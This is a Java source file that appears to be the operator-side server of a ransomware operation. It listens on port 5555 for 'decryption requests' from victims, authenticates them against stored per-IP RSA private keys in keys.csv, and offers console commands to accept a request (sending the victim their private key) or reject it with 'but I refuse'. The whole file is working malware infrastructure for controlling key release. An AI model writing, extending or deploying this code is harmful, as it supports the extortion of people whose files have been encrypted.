/*
Functionality:
1. receives decrypt requests from IPs, and store them in a file of IPs
2. decryption acceptance interface
3. get the key stored in a json file, send it to the victim.
*/

import java.io.*;
import java.net.*;
import java.util.*;
import java.security.*;
import javax.crypto.Cipher;
import java.io.File;
import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.spec.PKCS8EncodedKeySpec;


public class DecryptRequestHandler {
        public static final String ANSI_RESET = "\u001B[0m";
        public static final String ANSI_PURPLE = "\u001B[35m";
        public static final String DR_HEADER = ANSI_PURPLE + "[DecryptionRequestHandler]: " + ANSI_RESET;
        private int port;
        private ServerSocket server = null;
        private DataInputStream in = null;
        private DRListener l;
        private boolean running;

        public DecryptRequestHandler(int port) {
                this.port = port;
                startServer();

        }

        public boolean isRunning() {
                return running;
        }

        public void startServer() {
                try {
                        server = new ServerSocket(port);
                        l = new DRListener(server);
                        l.start();
                        running = true;
                } catch (IOException i) {
                        System.out.println(DR_HEADER + "Failed to start the server");
                }
        }

        public void stopServer() {
                try {
                        System.out.println(
                                        "Do you want to reject all authenticated requests to stop DecryptionRequestHandler? (y/N)");
                        System.out.print("?: ");
                        Scanner input = new Scanner(System.in);
                        String res = input.nextLine().toUpperCase();
                        if (res.equals("Y")) {
                                while (DRHandler.requests.size() > 0) {
                                        DRHandler.requests.get(0).reject();
                                }
                                // DRHandler.requests.clear();
                                server.close();
                                System.out.println(DR_HEADER + "Server stopped");
                        } else {
                                System.out.println(DR_HEADER + "Canceled operation");
                        }
                        running = false;
                } catch (IOException i) {
                        System.out.println(DR_HEADER + "Failed to stop the server");
                }

        }

        public void command(String cmd) { // receive command from the main server
                switch (cmd) {
                        case "help":
                                System.out.println(
                                                "DecryptRequestHandler is a module to listen for decryption requests, manage authenticated requests, and send private keys to accepted victims.\n");
                                System.out.println("DecryptionRequestHandler commands:\n");
                                System.out.println(
                                                "*tip: all DecryptionRequestHandler commands are ran with the DR header");
                                System.out.println("\tDR.help: show this page");
                                System.out.println("\tDR.off: stop DecryptionRequestHandler");
                                System.out.println("\tDR.on: turn on DecryptionRequestHandler");
                                System.out.println("\tDR.show: show authenticated requests");
                                System.out.println("\tDR.reject <idx>: reject a specific request by index");
                                System.out.println("\tDR.accept <idx>: accept a specific request by index");
                                return;
                        case "show": // show all authenticated requests
                                System.out.println("IDX\tIP\t\t\tIDhash");
                                for (int i = 0; i < DRHandler.requests.size(); i++) {
                                        DRHandler handler = DRHandler.requests.get(i);
                                        System.out.println(i + "\t" + handler.ip + "\t" + handler.idhash);
                                }
                                return;
                        case "off":
                                stopServer();
                                return;
                        case "on":
                                startServer();
                                return;
                        case "":
                                return;
                }
                if (cmd.split(" ")[0].equals("accept")) {
                        try {
                                int idx = Integer.parseInt(cmd.split(" ")[1]);
                                DRHandler.requests.get(idx).approve();
                        } catch (Exception e) {
                                System.out.println("Invalid index. run DR.help for information");
                        }

                        return;
                }

                else if (cmd.split(" ")[0].equals("reject")) {
                        try {
                                int idx = Integer.parseInt(cmd.split(" ")[1]);
                                DRHandler.requests.get(idx).reject();
                        } catch (Exception e) {
                                System.out.println("Invalid index. run DR.help for information");
                        }
                        return;
                }

                else {
                        System.out.println("Command not found");
                }

        }

        public DRListener getListener() {
                return l;
        }

        public static void main(String args[]) {
                DecryptRequestHandler server = new DecryptRequestHandler(5555);
        }

        public void run() {
                DecryptRequestHandler server = new DecryptRequestHandler(5555);
        }
}

class DRListener extends Thread {
        public static final String ANSI_RESET = "\u001B[0m";
        public static final String ANSI_PURPLE = "\u001B[35m";
        public static final String DR_HEADER = ANSI_PURPLE + "[DecryptionRequestHandler]: " + ANSI_RESET;
        private Socket socket = null;
        private ServerSocket server = null;
        private DataInputStream in = null;
        private DataOutputStream out = null;
        private int max_threads = 100;

        public DRListener(ServerSocket server) {
                this.server = server;
        }

        public void run() {
                try {
                        System.out.println(DR_HEADER + "request handler started");
                        System.out.println(DR_HEADER + "Waiting for clients ...");
                        while (true) {
                                try {
                                        DRHandler.keys = new File("keys.csv");
                                        break;
                                } catch (Exception e) {
                                        continue;
                                }
                        }
                        while (true) {
                                if (DRHandler.numOfThreads <= max_threads) {
                                        socket = server.accept();

                                        // takes input from the client socket
                                        in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));
                                        out = new DataOutputStream(socket.getOutputStream());

                                        System.out.println("spawning new handler");
                                        DRHandler handler = new DRHandler(socket, in, out);
                                        handler.start();

                                }
                        }

                } catch (Exception e) {
                        System.out.println(e);
                }
        }
}

class DRHandler extends Thread {
        public static final String ANSI_RESET = "\u001B[0m";
        public static final String ANSI_PURPLE = "\u001B[35m";
        public static final String DR_HEADER = ANSI_PURPLE + "[DecryptionRequestHandler]: " + ANSI_RESET;
        private Socket socket;
        private DataInputStream in;
        private DataOutputStream out;
        private String keyString = "";
        public String ip;
        public String idhash = "";
        public static ArrayList<DRHandler> requests = new ArrayList<DRHandler>();
        public static File keys;
        public static int numOfThreads = 0;

        public DRHandler(Socket socket, DataInputStream in, DataOutputStream out) {
                this.socket = socket;
                ip = socket.getRemoteSocketAddress().toString();
                this.in = in;
                this.out = out;
                numOfThreads++;

        }

        public boolean authenticate() {
                String id = "";
                String hash = "";
                boolean found = false;
                System.out.println(DR_HEADER + "Start authentication");
                while (!socket.isClosed()) {

                        try {
                                MessageDigest md = MessageDigest.getInstance("SHA-256");
                                String reqest = in.readUTF();
                                if (reqest.equals("RequestForDecryption")) {
                                        Random rand = new Random(System.currentTimeMillis());
                                        int tokenData = (int) (rand.nextInt(Integer.MAX_VALUE));
                                        byte[] tokenHashData = md.digest(String.valueOf(tokenData).getBytes(StandardCharsets.UTF_8));
                                        String RFToken = Base64.getEncoder().encodeToString(tokenHashData);
                                        out.writeUTF(RFToken);

                                        String recvString = in.readUTF();

                                        byte[] encryptedContent = Base64.getDecoder().decode(recvString.split(",")[0]);

                                        Scanner reader = new Scanner(keys);

                                        while (reader.hasNextLine()) {
                                                String line = reader.nextLine();
                                                String[] rows = line.split(",");
                                                if (rows[0].equals("IP")) {
                                                        continue;
                                                }
                                                if (rows[0].equals(socket.getRemoteSocketAddress().toString().split(":")[0]
                                                                .substring(1))) {
                                                        String b64KeyString = rows[1];
                                                        byte[] pub = Base64.getDecoder().decode(b64KeyString);
                                                        PKCS8EncodedKeySpec spec = new PKCS8EncodedKeySpec(pub);
                                                        KeyFactory factory = KeyFactory.getInstance("RSA");
                                                        PrivateKey private_key = factory.generatePrivate(spec); 

                                                        Cipher RSA_Cipher = Cipher.getInstance("RSA");
                                                        RSA_Cipher.init(Cipher.DECRYPT_MODE, private_key);
                                                        try {
                                                                byte[] decrypted = RSA_Cipher.doFinal(encryptedContent);
                                                                String decryptedString = new String(decrypted, StandardCharsets.UTF_8);
                                                                id = decryptedString.split(",")[0];
                                                                byte[] data = md.digest(id.getBytes(StandardCharsets.UTF_8));
                                                                hash = Base64.getEncoder().encodeToString(data);
                                                                idhash = hash;
                                                                System.out.println(hash);
                                                                if (rows[2].equals(hash)) {

                                                                        if (!decryptedString.split(",")[1].equals(RFToken)) {
                                                                                System.out.println(DR_HEADER + "Authentication failed");
                                                                                return false;
                                                                        }

                                                                        for (DRHandler req : requests) {
                                                                                if (req.idhash.equals(idhash)) {
                                                                                        System.out.println(DR_HEADER
                                                                                                        + "Authentication failed");
                                                                                        return false;
                                                                                }
                                                                        }

                                                                        found = true;
                                                                        requests.add(this);
                                                                        System.out.println(DR_HEADER + "Authentication succeeded");
                                                                        keyString = rows[1];
                                                                        return found;
                                                                }
                                                        } 
                                                        catch (Exception e) {
                                                                ;
                                                        }

                                                }
                                        }
                                        
                                }

                        } catch (FileNotFoundException e) {
                                System.out.println(DR_HEADER + "No keys.csv created, refusing connection");
                                close();
                                break;
                        } catch (Exception e) {
                                System.out.println(DR_HEADER + e);
                                break;
                        }
                }
                if (!found) {
                        System.out.println(DR_HEADER + "Authentication failed");
                        return found;
                }
                return found;
        }

        public void approve() {
                try {
                        out = new DataOutputStream(socket.getOutputStream());
                        out.writeUTF(keyString); // approve
                        if (requests.indexOf(this) >= 0) {
                                requests.remove(requests.indexOf(this));
                        }
                        Scanner reader = new Scanner(keys);
                        String content = "";

                        while (reader.hasNextLine()) {
                                String line = reader.nextLine();
                                String[] rows = line.split(",");
                                if (!rows[0].equals(socket.getRemoteSocketAddress().toString().split(":")[0]
                                                        .substring(1)) || !rows[2].equals(idhash)) {
                                        content += line+"\n";
                                }
                        }
                        FileWriter writer = new FileWriter(keys);
                        writer.write(content);
                        writer.close();

                        close();
                } catch (Exception e) {
                        System.out.println(e);
                        if (requests.indexOf(this) >= 0) {
                                requests.remove(requests.indexOf(this));
                        }
                        close();
                }

        }

        public void reject() {
                try {
                        out = new DataOutputStream(socket.getOutputStream());
                        out.writeUTF("but I refuse"); // reject
                        if (requests.indexOf(this) >= 0) {
                                requests.remove(requests.indexOf(this));
                        }
                        close();
                } catch (Exception e) {
                        System.out.println(e);
                        if (requests.indexOf(this) >= 0) {
                                requests.remove(requests.indexOf(this));
                        }
                        close();
                }

        }

        public void run() {

                // authenticate
                boolean auth = authenticate();
                if (auth) {
                        try {

                                while (!socket.isClosed()) {
                                        System.out.println(in.readUTF());
                                }
                        } catch (Exception e) {
                                if (requests.indexOf(this) >= 0) {
                                        requests.remove(requests.indexOf(this));
                                }
                                close();
                        }
                } else {
                        close();
                }

        }

        public void close() {
                try {
                        in.close();
                        socket.close();
                } catch (IOException i) {
                        System.out.println(i);
                }
        }
}
